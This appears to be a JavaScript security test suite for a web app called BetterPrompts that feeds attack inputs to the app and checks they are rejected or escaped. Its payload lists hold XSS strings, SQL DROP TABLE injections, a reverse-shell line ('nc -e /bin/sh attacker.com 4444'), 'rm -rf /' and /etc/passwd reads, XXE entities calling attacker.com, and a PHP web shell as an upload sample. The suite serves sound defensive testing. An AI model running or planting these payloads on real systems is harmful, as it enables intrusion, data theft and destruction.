/**
 * Web Security Tests for BetterPrompts
 * Tests XSS, CSRF, injection attacks, and other web vulnerabilities
 */

const { chromium } = require('playwright');
const axios = require('axios');
const { expect } = require('chai');
const crypto = require('crypto');

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
const API_BASE = process.env.API_BASE || 'http://localhost/api/v1';

describe('XSS (Cross-Site Scripting) Tests', () => {
  let browser;
  let context;
  let page;
  
  before(async () => {
    browser = await chromium.launch();
    context = await browser.newContext();
    page = await context.newPage();
  });
  
  after(async () => {
    await browser.close();
  });
  
  describe('Input Sanitization', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      '<select onfocus="alert(\'XSS\')" autofocus>',
      '<textarea onfocus="alert(\'XSS\')" autofocus>',
      '<body onload="alert(\'XSS\')">',
      '<div style="background:url(javascript:alert(\'XSS\'))">',
      '"><script>alert("XSS")</script>',
      '\'-alert("XSS")-\'',
      '\";alert("XSS");//',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<<script>alert("XSS");//<</script>',
      '<img src="x" onerror="eval(atob(\'YWxlcnQoIlhTUyIp\'))">',
      '<style>@import\'http://evil.com/xss.css\';</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">'
    ];
    
    it('should sanitize XSS payloads in prompt input', async () => {
      await page.goto(BASE_URL);
      
      for (const payload of xssPayloads) {
        // Listen for any dialogs (alerts)
        let alertFired = false;
        page.once('dialog', async dialog => {
          alertFired = true;
          await dialog.dismiss();
        });
        
        // Input XSS payload
        await page.fill('[data-testid="prompt-input"]', payload);
        await page.click('[data-testid="enhance-button"]');
        
        // Wait a bit to see if alert fires
        await page.waitForTimeout(1000);
        
        expect(alertFired).to.be.false;
        
        // Check that the payload is properly escaped in the output
        const outputText = await page.textContent('[data-testid="enhanced-output"]');
        expect(outputText).to.not.include('<script>');
        expect(outputText).to.not.include('javascript:');
      }
    });
    
    it('should sanitize XSS in user profile fields', async () => {
      // Login first
      await page.goto(`${BASE_URL}/login`);
      await page.fill('[name="email"]', 'xss-test@example.com');
      await page.fill('[name="password"]', 'TestPass123!');
      await page.click('[type="submit"]');
      
      // Navigate to profile
      await page.goto(`${BASE_URL}/profile`);
      
      // Try XSS in profile fields
      const profileFields = ['name', 'bio', 'website'];
      
      for (const field of profileFields) {
        for (const payload of xssPayloads.slice(0, 5)) {
          await page.fill(`[name="${field}"]`, payload);
          await page.click('[data-testid="save-profile"]');
          
          // Check no alert fired
          let alertFired = false;
          page.once('dialog', async dialog => {
            alertFired = true;
            await dialog.dismiss();
          });
          
          await page.waitForTimeout(500);
          expect(alertFired).to.be.false;
          
          // Verify escaped in display
          const displayValue = await page.textContent(`[data-testid="${field}-display"]`);
          expect(displayValue).to.not.include('<script>');
        }
      }
    });
    
    it('should prevent DOM-based XSS', async () => {
      // Test URL parameter injection
      const urlPayloads = [
        '#<script>alert("XSS")</script>',
        '?search=<script>alert("XSS")</script>',
        '?redirect=javascript:alert("XSS")',
        '?callback=alert("XSS")'
      ];
      
      for (const payload of urlPayloads) {
        let alertFired = false;
        page.once('dialog', async dialog => {
          alertFired = true;
          await dialog.dismiss();
        });
        
        await page.goto(`${BASE_URL}${payload}`);
        await page.waitForTimeout(1000);
        
        expect(alertFired).to.be.false;
      }
    });
  });
  
  describe('Content Security Policy', () => {
    it('should have proper CSP headers', async () => {
      const response = await page.goto(BASE_URL);
      const headers = response.headers();
      
      expect(headers['content-security-policy']).to.exist;
      const csp = headers['content-security-policy'];
      
      // Check for important CSP directives
      expect(csp).to.include("default-src 'self'");
      expect(csp).to.include("script-src");
      expect(csp).to.not.include("'unsafe-inline'");
      expect(csp).to.not.include("'unsafe-eval'");
    });
    
    it('should block inline script execution', async () => {
      // Create a page with inline script
      await page.setContent(`
        <html>
          <body>
            <div id="test">Original</div>
            <script>document.getElementById('test').innerHTML = 'XSS';</script>
          </body>
        </html>
      `);
      
      const content = await page.textContent('#test');
      expect(content).to.equal('Original'); // Script should not execute
    });
  });
});

describe('CSRF (Cross-Site Request Forgery) Tests', () => {
  describe('CSRF Token Validation', () => {
    it('should reject requests without CSRF token', async () => {
      const testData = { prompt: 'Test prompt' };
      
      try {
        await axios.post(`${API_BASE}/enhance`, testData, {
          headers: {
            'Content-Type': 'application/json',
            // No CSRF token
          },
          withCredentials: true
        });
        expect.fail('Should have rejected request without CSRF token');
      } catch (error) {
        expect(error.response.status).to.be.oneOf([403, 401]);
      }
    });
    
    it('should reject requests with invalid CSRF token', async () => {
      const testData = { prompt: 'Test prompt' };
      
      try {
        await axios.post(`${API_BASE}/enhance`, testData, {
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': 'invalid-token-12345'
          },
          withCredentials: true
        });
        expect.fail('Should have rejected request with invalid CSRF token');
      } catch (error) {
        expect(error.response.status).to.be.oneOf([403, 401]);
      }
    });
    
    it('should validate CSRF token matches session', async () => {
      // Get a valid CSRF token
      const sessionRes = await axios.get(`${API_BASE}/csrf-token`, {
        withCredentials: true
      });
      const validToken = sessionRes.data.token;
      
      // Try to use the token with a different session
      try {
        await axios.post(`${API_BASE}/enhance`, 
          { prompt: 'Test' },
          {
            headers: {
              'X-CSRF-Token': validToken
            },
            withCredentials: false // Different session
          }
        );
        expect.fail('Should reject CSRF token from different session');
      } catch (error) {
        expect(error.response.status).to.be.oneOf([403, 401]);
      }
    });
    
    it('should implement double-submit cookie pattern', async () => {
      // Login to get session
      const loginRes = await axios.post(`${API_BASE}/auth/login`, {
        email: 'csrf-test@example.com',
        password: 'TestPass123!'
      }, { withCredentials: true });
      
      const cookies = loginRes.headers['set-cookie'];
      const csrfCookie = cookies.find(c => c.includes('csrf-token'));
      expect(csrfCookie).to.exist;
      
      // Extract CSRF token from cookie
      const tokenMatch = csrfCookie.match(/csrf-token=([^;]+)/);
      const csrfToken = tokenMatch[1];
      
      // Make request with matching header
      const enhanceRes = await axios.post(`${API_BASE}/enhance`,
        { prompt: 'Test with CSRF' },
        {
          headers: {
            'X-CSRF-Token': csrfToken,
            'Cookie': csrfCookie
          }
        }
      );
      
      expect(enhanceRes.status).to.equal(200);
    });
  });
  
  describe('SameSite Cookie Protection', () => {
    it('should set SameSite attribute on session cookies', async () => {
      const loginRes = await axios.post(`${API_BASE}/auth/login`, {
        email: 'cookie-test@example.com',
        password: 'TestPass123!'
      }, { withCredentials: true, validateStatus: () => true });
      
      const cookies = loginRes.headers['set-cookie'] || [];
      const sessionCookie = cookies.find(c => c.includes('session'));
      
      expect(sessionCookie).to.include('SameSite=Strict');
    });
  });
});

describe('SQL Injection Tests', () => {
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1--",
    "1' AND '1'='1",
    "' OR 'x'='x",
    "\\'; DROP TABLE users; --",
    "1'; SELECT * FROM users WHERE 't' = 't",
    "' or 1=1 LIMIT 1 -- ' ]"
  ];
  
  it('should prevent SQL injection in login', async () => {
    for (const payload of sqlPayloads) {
      try {
        await axios.post(`${API_BASE}/auth/login`, {
          email: payload,
          password: payload
        });
      } catch (error) {
        // Should fail with 401, not 500 (which might indicate SQL error)
        expect(error.response.status).to.equal(401);
        expect(error.response.data).to.not.include('SQL');
        expect(error.response.data).to.not.include('database');
      }
    }
  });
  
  it('should prevent SQL injection in search', async () => {
    for (const payload of sqlPayloads) {
      const res = await axios.get(`${API_BASE}/search`, {
        params: { q: payload },
        validateStatus: () => true
      });
      
      // Should return empty results, not error
      expect(res.status).to.equal(200);
      expect(res.data.results).to.be.an('array');
      expect(res.data.results).to.have.length(0);
    }
  });
  
  it('should use parameterized queries', async () => {
    // This is more of an integration test
    // We're checking that the API handles special characters safely
    const safeButTrickyInputs = [
      "O'Brien", // Apostrophe in name
      "user@example.com; DROP TABLE users;", // Email with SQL
      "Test\" AND \"1\"=\"1", // Quotes
      "50% discount", // Special characters
      "price > 100 AND category='electronics'" // SQL-like syntax
    ];
    
    for (const input of safeButTrickyInputs) {
      const res = await axios.post(`${API_BASE}/enhance`, {
        prompt: input
      }, { validateStatus: () => true });
      
      expect(res.status).to.equal(200);
      expect(res.data.enhanced_prompt).to.exist;
    }
  });
});

describe('NoSQL Injection Tests', () => {
  const noSqlPayloads = [
    { $ne: null },
    { $gt: "" },
    { $where: "this.password == 'test'" },
    { email: { $regex: ".*" } },
    { "$or": [{ "email": "admin@example.com" }, { "email": { "$ne": "1" } }] },
    { "email": "test@test.com", "$comment": "successful MongoDB injection" }
  ];
  
  it('should prevent NoSQL injection in API requests', async () => {
    for (const payload of noSqlPayloads) {
      try {
        await axios.post(`${API_BASE}/auth/login`, payload);
      } catch (error) {
        expect(error.response.status).to.be.oneOf([400, 401]);
        expect(error.response.data).to.not.include('MongoDB');
        expect(error.response.data).to.not.include('$');
      }
    }
  });
});

describe('Command Injection Tests', () => {
  const commandPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`rm -rf /`',
    '$(whoami)',
    '&& echo "hacked"',
    '; nc -e /bin/sh attacker.com 4444',
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '%0a/bin/cat%20/etc/passwd',
    '|nslookup attacker.com'
  ];
  
  it('should prevent command injection in file operations', async () => {
    for (const payload of commandPayloads) {
      const res = await axios.post(`${API_BASE}/export`, {
        filename: payload,
        format: 'pdf'
      }, { validateStatus: () => true });
      
      expect(res.status).to.be.oneOf([400, 403]);
      expect(res.data.error).to.exist;
    }
  });
});

describe('XXE (XML External Entity) Tests', () => {
  const xxePayloads = [
    `<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <prompt>&xxe;</prompt>`,
    
    `<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
     <data>&xxe;</data>`,
    
    `<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [
       <!ELEMENT foo ANY>
       <!ENTITY xxe SYSTEM "expect://ls">
     ]>
     <foo>&xxe;</foo>`
  ];
  
  it('should prevent XXE attacks', async () => {
    for (const payload of xxePayloads) {
      const res = await axios.post(`${API_BASE}/import`, payload, {
        headers: { 'Content-Type': 'application/xml' },
        validateStatus: () => true
      });
      
      expect(res.status).to.be.oneOf([400, 415]);
      expect(res.data).to.not.include('/etc/passwd');
      expect(res.data).to.not.include('root:');
    }
  });
});

describe('Security Headers Tests', () => {
  it('should have all required security headers', async () => {
    const res = await axios.get(BASE_URL, { validateStatus: () => true });
    const headers = res.headers;
    
    // Check for security headers
    expect(headers['x-content-type-options']).to.equal('nosniff');
    expect(headers['x-frame-options']).to.be.oneOf(['DENY', 'SAMEORIGIN']);
    expect(headers['x-xss-protection']).to.equal('1; mode=block');
    expect(headers['strict-transport-security']).to.include('max-age=');
    expect(headers['referrer-policy']).to.exist;
    expect(headers['permissions-policy']).to.exist;
    
    // Should not expose server information
    expect(headers['server']).to.not.include('Apache');
    expect(headers['server']).to.not.include('nginx');
    expect(headers['x-powered-by']).to.not.exist;
  });
});

describe('File Upload Security Tests', () => {
  const maliciousFiles = [
    {
      name: 'shell.php',
      content: '<?php system($_GET["cmd"]); ?>',
      type: 'application/x-php'
    },
    {
      name: 'script.html',
      content: '<script>alert("XSS")</script>',
      type: 'text/html'
    },
    {
      name: 'eicar.com',
      content: 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
      type: 'application/octet-stream'
    },
    {
      name: '../../../etc/passwd',
      content: 'malicious content',
      type: 'text/plain'
    },
    {
      name: 'test.jpg.php',
      content: '<?php phpinfo(); ?>',
      type: 'image/jpeg'
    }
  ];
  
  it('should validate file types and reject malicious files', async () => {
    for (const file of maliciousFiles) {
      const formData = new FormData();
      const blob = new Blob([file.content], { type: file.type });
      formData.append('file', blob, file.name);
      
      try {
        await axios.post(`${API_BASE}/upload`, formData, {
          headers: { 'Content-Type': 'multipart/form-data' }
        });
        expect.fail(`Should have rejected ${file.name}`);
      } catch (error) {
        expect(error.response.status).to.be.oneOf([400, 415]);
      }
    }
  });
  
  it('should sanitize uploaded filenames', async () => {
    const dangerousFilenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file\x00.txt',
      'file%00.txt',
      'file\r\n.txt',
      'file;rm -rf /.txt'
    ];
    
    for (const filename of dangerousFilenames) {
      const formData = new FormData();
      const blob = new Blob(['safe content'], { type: 'text/plain' });
      formData.append('file', blob, filename);
      
      const res = await axios.post(`${API_BASE}/upload`, formData, {
        validateStatus: () => true
      });
      
      if (res.status === 200) {
        // If accepted, filename should be sanitized
        expect(res.data.filename).to.not.include('..');
        expect(res.data.filename).to.not.include('\x00');
        expect(res.data.filename).to.not.include(';');
      }
    }
  });
});